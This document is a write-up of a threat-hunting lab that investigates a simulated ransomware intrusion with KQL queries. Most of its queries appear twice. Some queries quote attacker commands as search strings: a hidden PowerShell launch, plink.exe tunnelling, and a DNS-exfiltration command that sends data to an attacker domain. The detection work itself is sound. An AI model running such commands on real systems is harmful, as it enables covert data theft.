# Castle & Sand

This analyst investigated an easy-level ransomware scenario by identifying adversaries' reconnaissance activities, analyzing themed phishing emails, and tracking ransomware deployment and impact. They used the Kusto Query Language (KQL) to analyze intrusion data and build an understanding of the ransomware attack lifecycle.

```KQL
Email
| take 10

Employees
| count

Employees
| where ip_addr has "10.10.2.1"

Employees
| where name contains "Jacqueline"
// jacqueline_henderson@castleandsand.com

Email
| where recipient contains "jacqueline_henderson@castleandsand.com"

Email
| where sender has "sunandsandtrading.com"
| distinct sender
| count

Employees
| where name contains "Cristin Genao"

OutboundNetworkEvents
| where src_ip contains "10.10.0.141"
| distinct url

PassiveDns
| where domain contains "shark"
| distinct domain

PassiveDns
| where domain contains "shark"

let karen_ip =
Employees
| where name contains "Karen"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (karen_ip)
| distinct url

FileCreationEvents
| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
| distinct hostname

let hostname_ransomware =
FileCreationEvents
| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
| distinct hostname;
Employees
| where hostname in (hostname_ransomware)
| distinct role

let IT_hostname =
Employees
| where role has "IT"
| distinct username;
AuthenticationEvents
| where username in (IT_hostname)

let unique_hostnames = 
FileCreationEvents
| where filename == "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
| distinct hostname;
Employees
| where hostname in (unique_hostnames)
| where role == "IT Helpdesk"
| count

Employees
| where ip_addr has ".46"

let impact_hosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
SecurityAlerts
| where description has_any (impact_hosts)

let impact_hosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
let helpdesk_hostnames = Employees
| where hostname in (impact_hosts)
| where role contains "IT Helpdesk"
| distinct hostname;
SecurityAlerts
| where description has_any (helpdesk_hostnames)
//A suspicious file was quarantined on host 6S7W-MACHINE: Chomping-Schedule_Changes.xlsx

Employees
| where hostname contains "6S7W"

FileCreationEvents
| where filename == 'Chomping-Schedule_Changes.xlsx'
| where hostname contains "6S7W"

FileCreationEvents
| where filename == 'Chomping-Schedule_Changes.xlsx'
| distinct hostname

let emp_hostnames =
FileCreationEvents
| where filename == "Chomping-Schedule_Changes.xlsx"
| distinct hostname;
let emp_ip =
Employees
| where hostname in (emp_hostnames)
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (emp_ip)
| distinct url
| where url has "xlsx"
| count

let preston_lane_ip =
Employees
| where hostname == "6S7W-MACHINE"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (preston_lane_ip)
| distinct url
| where url has "xlsx"

PassiveDns
| where domain contains "jawfin"
| distinct ip
// 193.248.75.126

let returned_query = 
PassiveDns
| where domain contains "sharkfin" or domain contains "jawfin"
| distinct ip;
InboundNetworkEvents
| where src_ip in (returned_query)

let returned_ip = 
PassiveDns
| where domain contains "sharkfin" or domain contains "jawfin"
| distinct ip;
AuthenticationEvents
| where src_ip in (returned_ip)

Email
| where link contains "sharkfin" or link contains "jawfin"

Email
| where sender contains "legal.sand@verizon.com"

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| count

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let threat_domain =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result;
PassiveDns
| where domain in (threat_domain)
| distinct ip

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let threat_domain =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result;
let threat_account =
PassiveDns
| where domain in (threat_domain)
| distinct ip;
AuthenticationEvents
| where src_ip in (threat_account)
| count 

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
FileCreationEvents
| where filename in (file_list)

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
// 220.35.180.137

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "echo"

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| sort by process_commandline

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
let parent_process_list =
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| distinct parent_process_name;
ProcessEvents
| where parent_process_name in (parent_process_list)

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let filename_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (filename_list)
| distinct hostname;
let parent_process_list =
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name == "powershell.exe"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| distinct parent_process_name;
ProcessEvents
| where process_commandline has_any (parent_process_list)

FileCreationEvents
| where filename endswith ".sharkfin"

Email
| where link contains "shark"

// onionmail.org

PassiveDns
| where domain contains "jawfin"
// https://www.maxmind.com/en/geoip-demo

// https://search.censys.io/hosts/193.248.75.126

let returned_query = 
PassiveDns
| where domain contains "sharkfin" or domain contains "jawfin"
| distinct ip;
InboundNetworkEvents
| where src_ip in (returned_query)
| distinct src_ip
// https://search.censys.io/hosts/157.242.169.232

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
FileCreationEvents
| where filename in (file_list)
// https://attack.mitre.org/software/

// https://attack.mitre.org/software/S0002/

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
let parent_process_list =
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| distinct parent_process_name;
ProcessEvents
| where parent_process_name in (parent_process_list)
| distinct parent_process_hash

// https://www.virustotal.com/gui/home/upload

// The ransomware family known as Rorschach abuses the legitimate Cortex XDR Dump Service Tool cy.exe to deploy its malicious payload.

Email
| where sender contains "castleandsand_official@outlook.com"

Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"

Email 
| where sender startswith "castleandsand_official@outlook.com" or sender startswith "castleandsandlegaldepartment@gmail.com" 
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
Employees
| where email_addr in (targeted_roles)
| distinct role

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let targeted_Authentication =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip;
InboundNetworkEvents
| where src_ip in (targeted_Authentication)
| where url has "download=true&"
| extend Filename = tostring(parse_url(url).['Query Parameters']['output'])
| distinct Filename

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let targeted_Authentication =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip;
InboundNetworkEvents
| where src_ip in (targeted_Authentication)
| where url has "download=true&"
| extend Filename = tostring(parse_url(url).['Query Parameters']['output'])
| distinct src_ip

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let targeted_Authentication =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip;
let targeted_domain =
PassiveDns
| where ip in (targeted_Authentication)
| distinct domain;

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
AuthenticationEvents
| where username in (targeted_username)
| where result == "Successful Login"
| distinct hostname

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let external_ip_list =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username)
| distinct src_ip;
let domain_list =
PassiveDns
| where ip in (external_ip_list)
| distinct domain;
let filenames =
OutboundNetworkEvents
| where tostring(parse_url(url).Host) in (domain_list)
| distinct url
| extend Path = tostring(parse_url(url).Path)
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
FileCreationEvents
| where filename in (filenames)
| distinct filename

let victim_hostname =
FileCreationEvents
| where filename in ("Work-Updates.docx", "HR_Notes.pdf", "employee.lnk", "Employee_Changes.xlsx", "store_updates.xlsx")
| distinct hostname;
FileCreationEvents
| where hostname in (victim_hostname)
| distinct hostname

ProcessEvents
// All related processes
| where parent_process_name in ("TSVIPSrv.dll", "1.exe", "i.exe", "wmi.dll", "procdump64.exe")
| where process_commandline has "plink.exe"
| distinct process_commandline

let victim_hostname =
FileCreationEvents
| where filename in ("Work-Updates.docx", "HR_Notes.pdf", "employee.lnk", "Employee_Changes.xlsx", "store_updates.xlsx")
| distinct hostname;
ProcessEvents
| where hostname in (victim_hostname)
| where process_commandline !contains "c:\\" and process_commandline !contains "exe" and process_commandline !contains "$"

let victim_hostname =
FileCreationEvents
| where filename in ("Work-Updates.docx", "HR_Notes.pdf", "employee.lnk", "Employee_Changes.xlsx", "store_updates.xlsx")
| distinct hostname;
ProcessEvents
| where hostname in (victim_hostname)
| where process_commandline !contains "c:\\" and process_commandline !contains "exe" and process_commandline !contains "$"
| distinct hostname

ProcessEvents
| where process_commandline contains "Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500"
| distinct hostname

let victim_hostname =
ProcessEvents
| where process_commandline contains "Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500"
| distinct hostname;
Employees
| where hostname in (victim_hostname)
| distinct role

let victim_hostname =
ProcessEvents
| where process_commandline contains "Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500"
| distinct hostname;
Employees
| where hostname in (victim_hostname)
| distinct ip_addr

// 5-1, 5-2

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let external_ip_list =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username)
| distinct src_ip;
PassiveDns
| where ip in (external_ip_list)
| distinct ip

Email
| take 10

Employees
| count

Employees
| where ip_addr has "10.10.2.1"

Employees
| where name contains "Jacqueline"
// jacqueline_henderson@castleandsand.com

Email
| where recipient contains "jacqueline_henderson@castleandsand.com"

Email
| where sender has "sunandsandtrading.com"
| distinct sender
| count

Employees
| where name contains "Cristin Genao"

OutboundNetworkEvents
| where src_ip contains "10.10.0.141"
| distinct url

PassiveDns
| where domain contains "shark"
| distinct domain

PassiveDns
| where domain contains "shark"

let karen_ip =
Employees
| where name contains "Karen"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (karen_ip)
| distinct url

FileCreationEvents
| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
| distinct hostname

let hostname_ransomware =
FileCreationEvents
| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
| distinct hostname;
Employees
| where hostname in (hostname_ransomware)
| distinct role

let IT_hostname =
Employees
| where role has "IT"
| distinct username;
AuthenticationEvents
| where username in (IT_hostname)

let unique_hostnames = 
FileCreationEvents
| where filename == "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
| distinct hostname;
Employees
| where hostname in (unique_hostnames)
| where role == "IT Helpdesk"
| count

Employees
| where ip_addr has ".46"

let impact_hosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
SecurityAlerts
| where description has_any (impact_hosts)

let impact_hosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
let helpdesk_hostnames = Employees
| where hostname in (impact_hosts)
| where role contains "IT Helpdesk"
| distinct hostname;
SecurityAlerts
| where description has_any (helpdesk_hostnames)
//A suspicious file was quarantined on host 6S7W-MACHINE: Chomping-Schedule_Changes.xlsx

Employees
| where hostname contains "6S7W"

FileCreationEvents
| where filename == 'Chomping-Schedule_Changes.xlsx'
| where hostname contains "6S7W"

FileCreationEvents
| where filename == 'Chomping-Schedule_Changes.xlsx'
| distinct hostname

let emp_hostnames =
FileCreationEvents
| where filename == "Chomping-Schedule_Changes.xlsx"
| distinct hostname;
let emp_ip =
Employees
| where hostname in (emp_hostnames)
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (emp_ip)
| distinct url
| where url has "xlsx"
| count

let preston_lane_ip =
Employees
| where hostname == "6S7W-MACHINE"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (preston_lane_ip)
| distinct url
| where url has "xlsx"

PassiveDns
| where domain contains "jawfin"
| distinct ip
// 193.248.75.126

let returned_query = 
PassiveDns
| where domain contains "sharkfin" or domain contains "jawfin"
| distinct ip;
InboundNetworkEvents
| where src_ip in (returned_query)

let returned_ip = 
PassiveDns
| where domain contains "sharkfin" or domain contains "jawfin"
| distinct ip;
AuthenticationEvents
| where src_ip in (returned_ip)

Email
| where link contains "sharkfin" or link contains "jawfin"

Email
| where sender contains "legal.sand@verizon.com"

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| count

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let threat_domain =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result;
PassiveDns
| where domain in (threat_domain)
| distinct ip

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let threat_domain =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result;
let threat_account =
PassiveDns
| where domain in (threat_domain)
| distinct ip;
AuthenticationEvents
| where src_ip in (threat_account)
| count 

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
FileCreationEvents
| where filename in (file_list)

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
// 220.35.180.137

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "echo"

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| sort by process_commandline

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
let parent_process_list =
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| distinct parent_process_name;
ProcessEvents
| where parent_process_name in (parent_process_list)

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let filename_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (filename_list)
| distinct hostname;
let parent_process_list =
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name == "powershell.exe"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| distinct parent_process_name;
ProcessEvents
| where process_commandline has_any (parent_process_list)

FileCreationEvents
| where filename endswith ".sharkfin"

Email
| where link contains "shark"

// onionmail.org

PassiveDns
| where domain contains "jawfin"
// https://www.maxmind.com/en/geoip-demo

// https://search.censys.io/hosts/193.248.75.126

let returned_query = 
PassiveDns
| where domain contains "sharkfin" or domain contains "jawfin"
| distinct ip;
InboundNetworkEvents
| where src_ip in (returned_query)
| distinct src_ip
// https://search.censys.io/hosts/157.242.169.232

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
FileCreationEvents
| where filename in (file_list)
// https://attack.mitre.org/software/

// https://attack.mitre.org/software/S0002/

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
let parent_process_list =
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| distinct parent_process_name;
ProcessEvents
| where parent_process_name in (parent_process_list)
| distinct parent_process_hash

// https://www.virustotal.com/gui/home/upload

// The ransomware family known as Rorschach abuses the legitimate Cortex XDR Dump Service Tool cy.exe to deploy its malicious payload.

Email
| where sender contains "castleandsand_official@outlook.com"

Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"

Email 
| where sender startswith "castleandsand_official@outlook.com" or sender startswith "castleandsandlegaldepartment@gmail.com" 
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
Employees
| where email_addr in (targeted_roles)
| distinct role

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let targeted_Authentication =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip;
InboundNetworkEvents
| where src_ip in (targeted_Authentication)
| where url has "download=true&"
| extend Filename = tostring(parse_url(url).['Query Parameters']['output'])
| distinct Filename

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let targeted_Authentication =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip;
InboundNetworkEvents
| where src_ip in (targeted_Authentication)
| where url has "download=true&"
| extend Filename = tostring(parse_url(url).['Query Parameters']['output'])
| distinct src_ip

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let targeted_Authentication =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip;
let targeted_domain =
PassiveDns
| where ip in (targeted_Authentication)
| distinct domain;

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
AuthenticationEvents
| where username in (targeted_username)
| where result == "Successful Login"
| distinct hostname

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let external_ip_list =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username)
| distinct src_ip;
let domain_list =
PassiveDns
| where ip in (external_ip_list)
| distinct domain;
let filenames =
OutboundNetworkEvents
| where tostring(parse_url(url).Host) in (domain_list)
| distinct url
| extend Path = tostring(parse_url(url).Path)
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
FileCreationEvents
| where filename in (filenames)
